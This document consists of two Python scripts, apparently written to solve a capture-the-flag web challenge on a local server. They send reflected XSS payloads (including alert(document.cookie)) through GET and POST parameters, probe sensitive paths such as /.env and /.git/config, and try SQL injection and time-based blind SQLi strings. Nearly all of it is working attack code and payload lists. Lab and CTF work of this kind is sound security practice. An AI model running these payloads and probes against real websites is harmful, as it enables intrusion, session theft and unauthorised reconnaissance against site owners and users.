import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:32955/page"
flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)

# First, check base page without any parameters
print("[+] Checking base page without parameters...")
resp_base = requests.get(base_url)
print(f"Status: {resp_base.status_code}")
print(f"Length: {len(resp_base.text)} bytes")
flags_base = flag_pattern.findall(resp_base.text)
if flags_base:
    print(f"[!] FLAG found on base page: {flags_base}")
print()

# Try the 'name' parameter (matching the form field)
print("[+] Testing with 'name' parameter (matching form field)...")
payloads = [
    "<img src=x onerror=top.alert('XSS')>",
    "<svg onload=top.alert('XSS')>",
    "<img src=x onerror=alert(document.cookie)>",
    "<img src=x onerror=alert(document.domain)>",
    "<img src=x onerror=alert(window.location.href)>",
    "<img src=x onerror=alert(document.title)>",
    "<img src=x onerror=alert(document.lastModified)>",
    "<img src=x onerror=alert(document.referrer)>",
    "<img src=x onerror=alert(navigator.userAgent)>",
    "<scr" + "ipt>alert('XSS')</scr" + "ipt>",
    "'><img src=x onerror=alert('XSS')>",
    "\"><img src=x onerror=alert('XSS')>",
    "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
]

for i, payload in enumerate(payloads, 1):
    try:
        # Try with 'name' parameter
        url = f"{base_url}?name={urllib.parse.quote(payload)}"
        resp = requests.get(url)
        flags = flag_pattern.findall(resp.text)
        
        if flags:
            print(f"[!] TEST {i}: FLAG FOUND!")
            print(f"    Payload: {payload}")
            print(f"    Flags: {flags}")
            print(f"    Full response:\n{resp.text[:1000]}")
        elif 'alert' in resp.text.lower() or payload in resp.text or urllib.parse.quote(payload) in resp.text:
            print(f"[+] TEST {i}: Payload reflected - {payload[:50]}")
            if 'alert' in resp.text.lower():
                print(f"    'alert' found in response")
                
    except Exception as e:
        print(f"[X] Error: {e}")

print("\n" + "=" * 60)
print("[+] Checking static files for flag...")

# Check common static file paths
static_paths = [
    "/static/css/style.css",
    "/static/css/xss/xss22.css",
    "/static/img/logo5_white.png",
    "/static/img/cookies/new_star.png",
    "/static/assets/fav-icon.png",
    "/robots.txt",
    "/.git/config",
    "/.env",
    "/config.json",
    "/package.json"
]

for path in static_paths:
    try:
        url = f"http://127.0.0.1:32955{path}"
        resp = requests.get(url, timeout=5)
        if resp.status_code == 200:
            flags = flag_pattern.findall(resp.text)
            if flags:
                print(f"[!] FLAG found in {path}: {flags}")
            else:
                print(f"[+] {path} exists (status: {resp.status_code})")
    except:
        pass

print("\n[+] Testing with POST to submit the form...")
# Try submitting the form via POST
post_payloads = [
    {'name': "<img src=x onerror=alert('XSS')>"},
    {'name': "<svg onload=alert('XSS')>"},
    {'name': "test<img src=x onerror=alert('XSS')>"},
    {'name': "'><img src=x onerror=alert('XSS')>"},
]

for data in post_payloads:
    try:
        resp = requests.post(base_url, data=data, timeout=5)
        flags = flag_pattern.findall(resp.text)
        if flags:
            print(f"[!] FLAG found with POST data {data}: {flags}")
            print(f"[+] Response:\n{resp.text[:800]}")
    except Exception as e:
        print(f"[X] POST error: {e}")

import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:32955"
flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)

print("[+] Reading static CSS/JS files for flags...")

# Check CSS files
css_files = [
    "/static/css/style.css",
    "/static/css/xss/xss22.css"
]

for css in css_files:
    url = f"{base_url}{css}"
    resp = requests.get(url)
    print(f"\n[+] {css}:")
    print(f"    Status: {resp.status_code}")
    print(f"    Length: {len(resp.text)} bytes")
    flags = flag_pattern.findall(resp.text)
    if flags:
        print(f"    [!] FLAGS: {flags}")
    # Print first 500 chars
    print(f"    Content preview:\n{resp.text[:500]}")

print("\n" + "=" * 60)
print("[+] Checking other endpoints and pages...")

# Check various endpoints
endpoints = [
    "/",
    "/page",
    "/index",
    "/home",
    "/admin",
    "/login",
    "/flag",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/security.txt"
]

for endpoint in endpoints:
    try:
        url = f"{base_url}{endpoint}"
        resp = requests.get(url, timeout=5)
        flags = flag_pattern.findall(resp.text)
        if flags:
            print(f"[!] FLAG found at {endpoint}: {flags}")
        elif resp.status_code == 200:
            print(f"[+] {endpoint} - Status {resp.status_code} ({len(resp.text)} bytes)")
    except Exception as e:
        print(f"[X] {endpoint} - Error: {e}")

print("\n" + "=" * 60)
print("[+] Trying various input parameter combinations...")

# Parameters based on common patterns
params_to_try = ['input', 'name', 'q', 'search', 'text', 'data', 'content', 'value', 'user', 'pass']
payload = "<img src=x onerror=alert('XSS')>"

for param in params_to_try:
    url = f"{base_url}/page?{param}={urllib.parse.quote(payload)}"
    try:
        resp = requests.get(url, timeout=5)
        flags = flag_pattern.findall(resp.text)
        if flags:
            print(f"[!] FLAG with param '{param}': {flags}")
        # Check for reflection
        if payload in resp.text or urllib.parse.unquote(payload) in resp.text:
            print(f"[+] Param '{param}' reflects payload")
    except:
        pass

print("\n" + "=" * 60)
print("[+] Trying SQL injection style payloads on XSS input...")

# Maybe there's combined SQLi + XSS
sqli_payloads = [
    "' OR '1'='1",
    "' UNION SELECT * FROM users--",
    "' AND 1=1--",
    "' OR '1'='1'--",
    "admin'--",
]

for payload in sqli_payloads:
    for param in ['input', 'name']:
        url = f"{base_url}/page?{param}={urllib.parse.quote(payload)}"
        try:
            resp = requests.get(url, timeout=5)
            flags = flag_pattern.findall(resp.text)
            if flags:
                print(f"[!] FLAG with SQLi payload '{payload}' on param '{param}': {flags}")
        except:
            pass

print("\n" + "=" * 60)
print("[+] Trying blind/time-based checks...")

# Check if server has timing differences
import time

normal_url = f"{base_url}/page"
start = time.time()
requests.get(normal_url)
normal_time = time.time() - start
print(f"[+] Normal request time: {normal_time:.3f}s")

# Try sleep payload (if SQLi exists)
sleep_payloads = [
    "' OR SLEEP(2)--",
    "'; WAITFOR DELAY '0:0:2'--",
]

for payload in sleep_payloads:
    url = f"{base_url}/page?input={urllib.parse.quote(payload)}"
    start = time.time()
    requests.get(url)
    elapsed = time.time() - start
    print(f"[+] Payload '{payload[:30]}...' took {elapsed:.3f}s")

print("\n[+] Testing complete.")

